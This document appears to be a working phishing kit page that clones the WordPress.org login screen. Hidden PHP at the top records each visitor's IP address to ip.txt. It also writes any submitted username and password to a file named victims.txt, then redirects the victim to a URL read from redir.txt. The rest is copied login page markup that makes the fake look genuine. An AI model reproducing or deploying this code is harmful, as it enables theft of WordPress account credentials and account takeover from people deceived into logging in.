<?php
function get_IP_address()
{
    foreach (array('HTTP_CLIENT_IP',
                   'HTTP_X_FORWARDED_FOR',
                   'HTTP_X_FORWARDED',
                   'HTTP_X_CLUSTER_CLIENT_IP',
                   'HTTP_FORWARDED_FOR',
                   'HTTP_FORWARDED',
                   'REMOTE_ADDR') as $key){
        if (array_key_exists($key, $_SERVER) === true){
            foreach (explode(',', $_SERVER[$key]) as $IPaddress){
                $IPaddress = trim($IPaddress); // Just to be safe

                if (filter_var($IPaddress,
                               FILTER_VALIDATE_IP,
                               FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)
                    !== false) {

                    return $IPaddress;
                }
            }
        }
    }
}
fwrite(fopen('ip.txt','w'),get_IP_address());
?>
<?php
$u = $_POST['log'];
$p = $_POST['pwd'];
$f = fopen('redir.txt','r');
$r = fread($f,filesize("redir.txt"));
fclose($f);
if ($u && $p){
	$f = fopen('victims.txt','a+');
    fwrite($f,'USERNAME : '.$u.' PASSWORD : '.$p."\n");
    fclose($f);
    echo "<script>window.location = '".$r."'</script>";
}
?>
<!DOCTYPE html>
<html lang="en-US"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta http-equiv="x-ua-compatible" content="ie=edge">
<title>WordPress.org Login | WordPress.org English</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="max-image-preview:large">
<link rel="dns-prefetch" href="https://www.google.com/">
<link rel="dns-prefetch" href="https://s.w.org/">
<link rel="dns-prefetch" href="https://www.googletagmanager.com/">
<script type="text/javascript" async="" src="./WordPress.org Login _ WordPress.org English_files/analytics.js"></script><script type="text/javascript" async="" src="./WordPress.org Login _ WordPress.org English_files/recaptcha__en.js" crossorigin="anonymous" integrity="sha384-EybSWcHgiPeEiW8PyVFCqH8ltF5BJVYLCCHJpTp2QsYs58TZJuGZOUGfGAPF4IjR"></script><script async="" src="./WordPress.org Login _ WordPress.org English_files/gtm.js"></script><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-P24PF4B');</script>
	<link rel="stylesheet" id="wp-block-library-css" href="./WordPress.org Login _ WordPress.org English_files/style.min.css" type="text/css" media="all">
<style id="wp-block-library-inline-css" type="text/css">
.has-text-align-justify{text-align:justify;}
</style>
<link rel="stylesheet" id="wporg-normalize-css" href="./WordPress.org Login _ WordPress.org English_files/normalize.css" type="text/css" media="all">
<link rel="stylesheet" id="dashicons-css" href="./WordPress.org Login _ WordPress.org English_files/dashicons.min.css" type="text/css" media="all">
<link rel="stylesheet" id="buttons-css" href="./WordPress.org Login _ WordPress.org English_files/buttons.min.css" type="text/css" media="all">
<link rel="stylesheet" id="forms-css" href="./WordPress.org Login _ WordPress.org English_files/forms.min.css" type="text/css" media="all">
<link rel="stylesheet" id="l10n-css" href="./WordPress.org Login _ WordPress.org English_files/l10n.min.css" type="text/css" media="all">
<link rel="stylesheet" id="login-css" href="./WordPress.org Login _ WordPress.org English_files/login.min.css" type="text/css" media="all">
<link rel="stylesheet" id="wporg-login-css" href="./WordPress.org Login _ WordPress.org English_files/login.css" type="text/css" media="all">
<script type="text/javascript" src="./WordPress.org Login _ WordPress.org English_files/api.js" id="recaptcha-api-v3-js"></script>
<script type="text/javascript" id="recaptcha-api-v3-js-after">
function reCaptcha_v3_init() {
			grecaptcha.execute("6LckXrgUAAAAANrzcMN7iy_WxvmMcseaaRW-YFts", {action: "login" }
			).then( function( token ) {
				// Add the token to the "primary" form
				var input = document.createElement( "input" ),
					form = document.getElementsByTagName("form")[0];

				input.setAttribute( "type", "hidden" );
				input.setAttribute( "name", "_reCaptcha_v3_token" );
				input.setAttribute( "value", token );

				form.appendChild( input );

				if ( form.dataset.submitReady ) {
					form.submit();
				} else {
					form.dataset.submitReady = true;
				}
			});
		}
</script>
<link rel="https://api.w.org/" href="https://login.wordpress.org/wp-json/"><meta name="generator" content="WordPress 5.8-alpha-50569">
<link rel="canonical" href="https://login.wordpress.org/">
</head>
<body class="wp-core-ui login js route-root">
<script type="text/javascript">document.body.className = document.body.className.replace('no-js','js');</script>
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P24PF4B" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
	
<div id="login">
	<h1><a href="https://wordpress.org/" tabindex="-1">Powered by WordPress</a></h1>
<p class="intro">Log in to your WordPress.org account to contribute to WordPress, get help in the support forum, or rate and review themes and plugins.</p>


		<form name="loginform" id="loginform" action="" method="post" data-submit-ready="true">
			
			<p class="login-username">
				<label for="user_login">Username or Email Address</label>
				<input type="text" name="log" id="user_login" class="input" value="" size="20" required>
			</p>
			<p class="login-password">
				<label for="user_pass">Password</label>
				<input type="password" name="pwd" id="user_pass" class="input" value="" size="20" required>
			</p>
			
			<p class="login-remember"><label><input name="rememberme" type="checkbox" id="rememberme" value="forever"> Remember Me</label></p>
			<p class="login-submit">
				<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary" value="Log In">
				<input type="hidden" name="redirect_to" value="https://login.wordpress.org/">
			</p>
			
		<input type="hidden" name="_reCaptcha_v3_token" value="03AGdBq25IUqPg84ubcNALv9I0oiIxlKCJoUu0YrJF5MufxAeEtQVi37k-Z42YZvyGdezEqpPTKQNFStko72WlKibXaUN55OJq2tur1qe1RWzYRGUFXM99MCiizobPny2e6ImWFVxnHYlD91V6_dtowqLz4fYiOG8Wy0COHMGancKbpNN73sDKYBjXMYEA1W9E3iTbeS7-r07KYVaz7VTsKTfZaoXiReTxrQ9W3JN8f2-NDGemv28bH-K69sS3ePSr40dX0uErXhGfxd9s_Uc24aQWGaIXrH4Y92Xzfz_bLL_AekWScxPcUWqtMOm39WzzOMuJuP4hsMY0GJJoDlvqhzqL6-7dy2VgkJmx2GKDT6iQuAjqWtpcGMnZpKPva12Kj31OuBrScQUZtHTuiTgdxyFQoS4uOSRIMRPj6k7kD5iRY-VCN7GGEm7RYGJBGUsUF4Taznm0Ml4JGUXrWqkJFbSye5OshRFdOg"></form>
<p id="nav">
	<a href="https://login.wordpress.org/lostpassword" title="Password Lost and Found">Lost password?</a> &nbsp; • &nbsp;
	<a href="https://login.wordpress.org/register" title="Create an account">Create an account</a>
</p>

<script type="text/javascript">
setTimeout( function() {
	try {
		d = document.getElementById( 'user_login' );
		d.focus();
		d.select();
	} catch( e ){}
}, 200 );
</script>


	</div>

	<div class="language-switcher">
		<form id="language-switcher" action="https://login.wordpress.org/" method="GET">
						<label for="language-switcher-locales">
				<span aria-hidden="true" class="dashicons dashicons-translation"></span>
				<span class="screen-reader-text">Select the language:</span>
			</label>
			<select id="language-switcher-locales" name="locale">
				<option value="fa_AF">(فارسی (افغانستان</option><option value="gax">Afaan Oromoo</option><option value="af">Afrikaans</option><option value="so_SO">Afsoomaali</option><option value="arg">Aragonés</option><option value="frp">Arpitan</option><option value="ast">Asturianu</option><option value="ibo">Asụsụ Igbo</option><option value="az_TR">Azərbaycan Türkcəsi</option><option value="az">Azərbaycan dili</option><option value="id_ID">Bahasa Indonesia</option><option value="ms_MY">Bahasa Melayu</option><option value="jv_ID">Basa Jawa</option><option value="su_ID">Basa Sunda</option><option value="bs_BA">Bosanski</option><option value="bre">Brezhoneg</option><option value="ca">Català</option><option value="bal">Català (Balear)</option><option value="ceb">Cebuano</option><option value="sna">ChiShona</option><option value="pcd">Ch’ti</option><option value="co">Corsu</option><option value="me_ME">Crnogorski jezik</option><option value="cy">Cymraeg</option><option value="da_DK">Dansk</option><option value="de_DE">Deutsch</option><option value="de_CH">Deutsch (Schweiz)</option><option value="de_CH_informal">Deutsch (Schweiz, Du)</option><option value="de_DE_formal">Deutsch (Sie)</option><option value="de_AT">Deutsch (Österreich)</option><option value="dsb">Dolnoserbšćina</option><option value="et">Eesti</option><option value="en_US" selected="selected">English</option><option value="en_AU">English (Australia)</option><option value="en_CA">English (Canada)</option><option value="en_NZ">English (New Zealand)</option><option value="art_xpirate">English (Pirate)</option><option value="en_ZA">English (South Africa)</option><option value="en_GB">English (UK)</option><option value="es_ES">Español</option><option value="es_AR">Español de Argentina</option><option value="es_CL">Español de Chile</option><option value="es_CO">Español de Colombia</option><option value="es_CR">Español de Costa Rica</option><option value="es_EC">Español de Ecuador</option><option value="es_GT">Español de Guatemala</option><option value="es_HN">Español de Honduras</option><option value="es_MX">Español de México</option><option value="es_PE">Español de Perú</option><option value="es_PR">Español de Puerto Rico</option><option value="es_DO">Español de República Dominicana</option><option value="es_UY">Español de Uruguay</option><option value="es_VE">Español de Venezuela</option><option value="eo">Esperanto</option><option value="eu">Euskara</option><option value="ewe">Eʋegbe</option><option value="fr_FR">Français</option><option value="fr_BE">Français de Belgique</option><option value="fr_CA">Français du Canada</option><option value="fur">Friulian</option><option value="fy">Frysk</option><option value="fo">Føroyskt</option><option value="ga">Gaelige</option><option value="gl_ES">Galego</option><option value="gd">Gàidhlig</option><option value="hau">Harshen Hausa</option><option value="hsb">Hornjoserbšćina</option><option value="hr">Hrvatski</option><option value="ido">Ido</option><option value="kin">Ikinyarwanda</option><option value="it_IT">Italiano</option><option value="kal">Kalaallisut</option><option value="cor">Kernewek</option><option value="sw">Kiswahili</option><option value="mfe">Kreol Morisien</option><option value="hat">Kreyol ayisyen</option><option value="kmr">Kurdî</option><option value="lv">Latviešu valoda</option><option value="lt_LT">Lietuvių kalba</option><option value="li">Limburgs</option><option value="lmo">Lombardo</option><option value="lb_LU">Lëtzebuergesch</option><option value="lij">Lìgure</option><option value="hu_HU">Magyar</option><option value="mg_MG">Malagasy</option><option value="mlt">Malti</option><option value="nl_NL">Nederlands</option><option value="nl_BE">Nederlands (België)</option><option value="nl_NL_formal">Nederlands (Formeel)</option><option value="lin">Ngala</option><option value="pcm">Nigerian Pidgin</option><option value="nb_NO">Norsk bokmål</option><option value="nn_NO">Norsk nynorsk</option><option value="oci">Occitan</option><option value="lug">Oluganda</option><option value="uz_UZ">O‘zbekcha</option><option value="pap_AW">Papiamento</option><option value="pap_CW">Papiamentu</option><option value="pl_PL">Polski</option><option value="pt_PT">Português</option><option value="pt_PT_ao90">Português (AO90)</option><option value="pt_AO">Português de Angola</option><option value="pt_BR">Português do Brasil</option><option value="fuc">Pulaar</option><option value="sq_XK">Për Kosovën Shqip</option><option value="kaa">Qaraqalpaq tili</option><option value="tah">Reo Tahiti</option><option value="ro_RO">Română</option><option value="roh">Rumantsch</option><option value="rhg">Ruáinga</option><option value="srd">Sardu</option><option value="sq">Shqip</option><option value="ssw">SiSwati</option><option value="scn">Sicilianu</option><option value="sk_SK">Slovenčina</option><option value="sl_SI">Slovenščina</option><option value="fi">Suomi</option><option value="sv_SE">Svenska</option><option value="syr">Syriac</option><option value="tl">Tagalog</option><option value="kab">Taqbaylit</option><option value="mri">Te Reo Māori</option><option value="vi">Tiếng Việt</option><option value="twd">Twents</option><option value="tuk">Türkmençe</option><option value="tr_TR">Türkçe</option><option value="vec">Vèneto</option><option value="wol">Wolof</option><option value="yor">Yorùbá</option><option value="fon">fɔ̀ngbè</option><option value="xho">isiXhosa</option><option value="zul">isiZulu</option><option value="is_IS">Íslenska</option><option value="cs_CZ">Čeština</option><option value="szl">Ślōnskŏ gŏdka</option><option value="el">Ελληνικά</option><option value="bel">Беларуская мова</option><option value="bg_BG">Български</option><option value="os">Ирон</option><option value="kir">Кыргызча</option><option value="mk_MK">Македонски јазик</option><option value="mn">Монгол</option><option value="ru_RU">Русский</option><option value="sah">Сахалыы</option><option value="sr_RS">Српски језик</option><option value="tt_RU">Татар теле</option><option value="tg">Тоҷикӣ</option><option value="uk">Українська</option><option value="kk">Қазақ тілі</option><option value="hy">Հայերեն</option><option value="he_IL">עִבְרִית</option><option value="ug_CN">ئۇيغۇرچە</option><option value="ur">اردو</option><option value="arq">الدارجة الجزايرية</option><option value="ar">العربية</option><option value="ary">العربية المغربية</option><option value="bcc">بلوچی مکرانی</option><option value="skr">سرائیکی</option><option value="snd">سنڌي</option><option value="fa_IR">فارسی</option><option value="ckb">كوردی‎</option><option value="haz">هزاره گی</option><option value="ps">پښتو</option><option value="azb">گؤنئی آذربایجان</option><option value="dv">ދިވެހި</option><option value="nqo">ߒߞߏ</option><option value="ne_NP">नेपाली</option><option value="brx">बोडो‎</option><option value="sa_IN">भारतम्</option><option value="bho">भोजपुरी</option><option value="mr">मराठी</option><option value="mai">मैथिली</option><option value="hi_IN">हिन्दी</option><option value="as">অসমীয়া</option><option value="bn_BD">বাংলা</option><option value="bn_IN">বাংলা (ভারত)</option><option value="pa_IN">ਪੰਜਾਬੀ</option><option value="gu">ગુજરાતી</option><option value="ory">ଓଡ଼ିଆ</option><option value="ta_LK">தமிழ்</option><option value="ta_IN">தமிழ்</option><option value="te">తెలుగు</option><option value="kn">ಕನ್ನಡ</option><option value="ml_IN">മലയാളം</option><option value="si_LK">සිංහල</option><option value="th">ไทย</option><option value="lo">ພາສາລາວ</option><option value="bo">བོད་ཡིག</option><option value="dzo">རྫོང་ཁ</option><option value="my_MM">ဗမာစာ</option><option value="ka_GE">ქართული</option><option value="tir">ትግርኛ</option><option value="am">አማርኛ</option><option value="km">ភាសាខ្មែរ</option><option value="tzm">ⵜⴰⵎⴰⵣⵉⵖⵜ</option><option value="zgh">ⵜⴰⵎⴰⵣⵉⵖⵜ</option><option value="zh_SG">中文</option><option value="ja">日本語</option><option value="zh_CN">简体中文</option><option value="zh_TW">繁體中文</option><option value="zh_HK">香港中文版	</option><option value="ko_KR">한국어</option><option value="art_xemoji">🌏🌍🌎 (Emoji)</option>			</select>
		</form>
	</div>
	<script>
		var switcherForm  = document.getElementById( 'language-switcher' );
		var localesSelect = document.getElementById( 'language-switcher-locales' );
		localesSelect.addEventListener( 'change', function() {
			switcherForm.submit()
		} );
	</script>
	


<div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe src="./WordPress.org Login _ WordPress.org English_files/anchor.html" width="256" height="60" role="presentation" name="a-ma3qasir8v0a" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;" src="./WordPress.org Login _ WordPress.org English_files/saved_resource(1).html"></iframe></div></body></html>